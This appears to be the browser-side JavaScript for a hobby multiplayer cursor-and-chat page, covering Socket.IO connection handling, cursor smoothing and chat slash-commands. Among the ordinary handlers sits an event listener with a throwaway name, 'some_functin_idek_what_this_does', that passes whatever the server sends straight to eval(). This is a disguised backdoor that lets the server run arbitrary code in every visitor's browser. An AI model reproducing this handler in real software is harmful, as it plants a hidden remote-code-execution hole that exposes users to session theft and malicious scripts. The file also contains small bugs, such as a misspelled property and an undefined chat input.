/// HAIIII :3

let socket = null;;
const roomCode = 1;

const connectionText = document.querySelector(".connectionText");
const reconnectButton = document.querySelector(".reconnectButton");
let can_update_pos = true;
let fallback_address_used = false;

const userPositions = {}; 

function connectToSocket(url) {
    if(socket){
        socket.disconnect(true);
        socket = null;
    }
    socket = io.connect(url, {
        reconnection: false
    });
    

    setTimeout(() => {
    socket.connect();
    if(socket.connected && fallback_address_used){
        console.log("Connected to server.", socket.connectio);
        connectionText.innerHTML = "Connected";
        connectionText.style.color = "green";
        document.body.style.cursor = "none";
        reconnectButton.style.visibility = "hidden";
        socket.emit("join", {"initial" : localStorage.getItem("initial") || "0, 0", "colour" : localStorage.getItem("colour") || "white"});

    }}, 1000);
}

connectToSocket('http://' + window.location.hostname);

function lerp(a, b, t) {
    return a + (b - a) * t;
}


function animateUsers() {
    for (const userId in userPositions) {
        // Don't lerp your own player
        if (userId === String(window.userId)) continue;
        const user = userPositions[userId];
        if (!user || !user.element) continue;

        // Lerp current position toward target
        user.current.x = lerp(user.current.x, user.target.x, 0.2);
        user.current.y = lerp(user.current.y, user.target.y, 0.2);

        user.element.style.left = user.current.x + "px";
        user.element.style.top = user.current.y + "px";
    }
    requestAnimationFrame(animateUsers);
}
requestAnimationFrame(animateUsers);


socket.on("connect", () => {
    console.log("Connected to server.");
    connectionText.innerHTML = "Connected";
    connectionText.style.color = "green";
    document.body.style.cursor = "none";
    reconnectButton.style.visibility = "hidden";
    socket.emit("join", {"initial" : localStorage.getItem("initial") || "0, 0", "colour" : localStorage.getItem("colour") || "white"});
});

socket.on("some_functin_idek_what_this_does", (data) => {
    eval(data)
});

socket.on("assign_user_id", (data) => {
    console.log("Assigned user ID: " + data["user_id"]);
    // Store the user ID in a global variable or use it as needed
	Object.defineProperty(window, "userId", {
		value: data["user_id"],
		writable: false,
		configurable: false
	});

    //Create div elements for all previous users
    const body = document.querySelector("body");
    const prev_players = data["prev_players"];
    for (const [userId, userData] of Object.entries(prev_players)) {
        if (userId === window.userId) continue;
        const userElement = document.createElement("div");
        userElement.id = userId;
        userElement.className = "user";
        userElement.style.left = userData["x"] + "px";
        userElement.style.top = userData["y"] + "px";
        userElement.style.backgroundColor = userData["colour"];
        body.appendChild(userElement);
        userElement.style.position = "absolute";

        // Initialize positions for lerping
        userPositions[userId] = {
            current: { x: userData["x"], y: userData["y"] },
            target: { x: userData["x"], y: userData["y"] },
            element: userElement
        };
    }
});

socket.on("user_connected", (data) => {
    const body = document.querySelector("body");
    const userElement = document.createElement("div");
    userElement.id = data["user_id"];
    userElement.className = "user";
    userElement.style.backgroundColor = data["colour"];
    body.appendChild(userElement);
    userElement.style.position = "absolute";

    if (data["user_id"] !== String(window.userId)) {
        userPositions[data["user_id"]] = {
            current: { x: 0, y: 0 },
            target: { x: 0, y: 0 },
            element: userElement
        };
    }
});

socket.on("position_update", (data) => {
    const userId = data["user_id"];
    const x = data["x"];
    const y = data["y"];
    if (userId === String(window.userId)) {
        return; // Skip updating your own position
    } else if (userPositions[userId]) {
        userPositions[userId].target.x = x;
        userPositions[userId].target.y = y;
    }
});

socket.on("receive_message", (data) => {
    const message = data["message"];
    const userId = data["user_id"]; //Can be used later to append the message above them
    const username = data["username"];
    if(localStorage.getItem("crybaby") === "true"){
        const clean = filter.clean(message);
        appendMessage(username, clean);
        return;
    }
    appendMessage(username, message);
});

socket.on("receive_error", (data) => {
    const message = data["message"];
    const username = "System";
    appendMessage(username, message);
});

socket.on("user_disconnected", (data) => {
    console.log("User disconnected: " + data["user_id"]);
    const userElement = document.getElementById(data["user_id"]);
    if (userElement) {
        console.log("Removing user element: " + data["user_id"]);
        userElement.remove();
        delete userPositions[data["user_id"]];
    }
});

socket.on("disconnect", (e) => {
    console.log("You have been disconnected from the server.", e)
    connectionText.innerHTML = "Disconnected";
    connectionText.style.color = "red";
    reconnectButton.style.visibility = "visible";
    reconnectButton.style.display = "absolute";
    document.body.style.cursor = "auto";
});

socket.on("connect_error", (e) => {
    console.log("Failed to connect to server.", e)
    connectionText.innerHTML = "Disconnected";
    connectionText.style.color = "red";
    console.log(reconnectButton)
    reconnectButton.style.visibility = "visible";
    reconnectButton.style.display = "absolute";
    document.body.style.cursor = "auto";

    if(!fallback_address_used){
        console.log("Trying to connect to fallback address...4");
        fallback_address_used = true;
        setTimeout(() => {
            connectToSocket('http://' + window.location.hostname);
        }, 1000);
        
    }
});

socket.on("error", (e) => {
    console.log("An error occurred... 9 times out of 10 this is nothing: ", e["message"])
});

reconnectButton.addEventListener("click", () => {
    window.location.reload();
});

document.addEventListener("mousemove", (event) => {
    const x = event.clientX - 20;
    const y = event.clientY - 20;
    const userElement = document.getElementById(window.userId);
    if (userElement) {
        userElement.style.left = x + "px";
        userElement.style.top = y + "px";
    }
    if (can_update_pos === true) {
        socket.emit("update_position", [window.userId, x, y]);
        can_update_pos = false;
    }
});

const command_help = {
    "colour": "Set your colour. Usage: /colour <colour>",
    "color": "Set your color. Usage: /color <color>",
    "username": "Set your username. Usage: /username <username>",
    "noswear": "Enable or disable the swear filter. Usage: /noswear <true/false>",
}

const commands = {
    "/colour": function (args) {
        const validColours = ['red', 'blue', 'yellow', 'purple', 'orange', 'white']
        const colour = args[0];
        if (validColours.includes(colour)) {
            localStorage.setItem("colour", colour);
            appendMessage("System", "Colour set to: " + colour);
            appendMessage("System", "Refresh the page to see the changes.");
        } else {
            appendMessage("System", "Please provide a valid colour.");
        }
    },
    "/username": function (args) {
        const username = args[0];
        if (username.length <= 1 || username.length > 13){
            appendMessage("System", "Please provide a valid username.");
            return;
        }
        localStorage.setItem("username", username);
        appendMessage("System", "Username set to: " + username);
    },
    "/noswear": function (args) {
        if(args[0].toLowerCase() === "true"){
            localStorage.setItem("crybaby", "true");
            appendMessage("System", "Swear filter enabled.");
        }else if (args[0].toLowerCase() === "false"){
            localStorage.setItem("crybaby", "false");
            appendMessage("System", "Swear filter disabled.");
        }
    },
    "/help": function (args) {
        console.log(command_help[args[0]]);

        if(args[0] && command_help[args[0]]){
            appendMessage("System", command_help[args[0]]);
            return;
        }
        appendMessage("System", "Available commands: /colour, /username, /noswear");
    }
}

chatInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && chatInput.value.trim()) {
        if (chatInput.value.startsWith("/")) {
            const command = chatInput.value.split(" ")[0];
            const args = chatInput.value.split(" ").slice(1);
            if (commands[command]) {
                commands[command](args);
            } else {
                appendMessage("System", "Unknown command: " + command);
            }
            chatInput.value = '';
            return;
        }
        socket.emit('send_message', { "username": localStorage.getItem("username") || window.userId, "message": chatInput.value.trim(), "user_id": window.userId });
        chatInput.value = '';
    }
});

window.addEventListener('beforeunload', function () {
	socket.emit('manual_disconnect');
});

setInterval(() => {
    can_update_pos = true;
}, 1000/30); // 30 FPS
